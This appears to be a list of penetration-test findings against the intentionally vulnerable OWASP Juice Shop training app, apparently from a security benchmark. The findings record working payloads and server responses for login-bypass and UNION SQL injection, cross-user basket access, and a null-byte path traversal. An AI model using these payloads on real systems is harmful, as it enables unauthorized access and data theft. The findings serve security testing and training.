findings.title: DVWA HIGH OS Command Injection via pipe without trailing space

findings.title: Cross-User Basket Access / BOLA on GET /rest/basket/{id}
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6, UserId=22) -> 200, basket 6 contains 'Apple Juice (1000ml)' quantity 3
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7) -> 200, returns acct1's basket 6 data
findings.response_evidence: acct2 (acct2_bench@juiceshop.local, own_basket_id=7) requested /rest/basket/6 and received acct1's basket: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"quantity":3}}]}}. The server performs no ownership check — acct2 retrieved Account 1's distinct seeded item 'Apple Juice (1000ml)' quantity 3. Note UserId=22 belongs to acct1, confirming cross-user access.

findings.title: Login Authentication-Bypass SQL Injection on POST /rest/user/login
findings.response_evidence: SQLi payload email=' OR 1=1-- with arbitrary password returned HTTP 200 with a valid auth token: [REDACTED]"authentication":{"token":"[JWT present/REDACTED]","bid":1,"umail":"admin@juice-sh.op"}}. The injection bypasses credential checking and authenticates as the first user admin@juice-sh.op (resolved umail=admin@juice-sh.op, bid=1), proving auth-bypass SQLi. Baseline bad creds normally return 401 'Invalid email or password.'

findings.title: Product-Search SQL Injection on GET /rest/products/search?q=
findings.response_evidence: Single quote payload q=qwert' returned HTTP 500 with body: 'Error: SQLITE_ERROR: near \"'%'\": syntax error OWASP Juice Shop (Express ^4.17.1) 500' — proving unsanitized input in a SQL query. The 9-column UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 without error: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — the injected constants 1-9 map directly into the result columns, confirming successful UNION-based SQL injection (9-column alignment).

findings.title: Confidential Acquisitions Document via Open /ftp/ Directory Listing
request_sequence: GET /ftp/ (Accept: text/html,application/json) -> 200, directory listing enumerates acquisitions.md (909 bytes)
GET /ftp/acquisitions.md -> 200 text/markdown, full confidential memo returned
findings.response_evidence:
The /ftp/ directory is browsable (HTTP 200, serve-index) and its listing enumerates 'acquisitions.md 909' along with other files (coupons_2013.md.bak, package.json.bak, incident-support.kdbx, etc.). Direct unauthenticated GET /ftp/acquisitions.md returns HTTP 200 with the confidential memo: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...' and closes with 'Our shareholders will be excited. It's true. No fake news.' This discloses a document explicitly marked confidential to an unauthenticated user.

findings.title: Unauthenticated User-Feedback PII Exposure (author emails disclosed)
request_sequence: GET /api/Feedbacks (unauth session, no Authorization header) -> 200 application/json
findings.response_evidence: Unauthenticated GET /api/Feedbacks returns HTTP 200 with full feedback records tied to UserId values. The comment fields leak author email addresses, e.g. UserId:1 comment ends with '(***in@juice-sh.op)', UserId:21 comment '...wallet at /juicy-nft...(***ereum@juice-sh.op)', UserId:3 '(***der@juice-sh.op)'. Although local-parts are partially masked, the email domain juice-sh.op and association to specific UserIds plus a leaked crypto wallet seed phrase ('purpose betray marriage blame crunch monitor spin slide donate sport lift clutch') are disclosed to anonymous users. The endpoint returns author-tied PII without authentication, confirming CWE-359.

findings.title: Exposed Encryption-Keys Directory (browsable listing exposes key files)
request_sequence: GET /encryptionkeys/ (unauth session) -> 200 text/html, serve-index directory listing
findings.response_evidence: Unauthenticated GET /encryptionkeys/ returns HTTP 200 with a browsable serve-index listing: 'listing directory /encryptionkeys/ ... jwt.pub 248 12/19/2023 ... premium.key 50 12/19/2023'. Both sensitive key files (jwt.pub, premium.key) are enumerated and directly linkable (/encryptionkeys/jwt.pub, /encryptionkeys/premium.key), confirming CWE-548 exposed encryption-keys directory.

findings.title: Poison Null-Byte Path Traversal bypasses /ftp/ extension filter to serve restricted package.json.bak
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (session=unauth) -> HTTP 403, body: 'Error: Only .md and .pdf files are allowed!' from fileServer.js:55 verify filter
GET http://juiceshop:3000/ftp/package.json.bak%2500.md (session=unauth) -> HTTP 200, Content-Type application/octet-stream, serves raw package.json backup content
findings.response_evidence: Step 1 (raw path, BLOCKED): GET /ftp/package.json.bak returned HTTP 403 with error body: "Error: Only .md and .pdf files are allowed!" (thrown by verify() at /juice-shop/build/routes/fileServer.js:55 — the extension whitelist filter). Step 2 (null-byte bypass, SUCCESS): GET /ftp/package.json.bak%2500.md returned HTTP 200 with Content-Type application/octet-stream and the actual restricted backup file content. Excerpt proving the real package.json backup was served: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", "homepage": "http://owasp-juice.shop", ... "dependencies": { "body-parser": "~1.18", "express": "~4.16", "express-jwt": "0.1.3", "jsonwebtoken": "~8", "sequelize": "~4", "sqlite3": "~3.1.13" ... } }'. The URL-encoded null byte (%2500 => %00) truncates the filename at the OS layer so the server's whitelist sees '.md' while the filesystem opens 'package.json.bak', confirming the poison null-byte traversal/extension-filter bypass. BOTH conditions (403 raw + 200 with file content) hold.
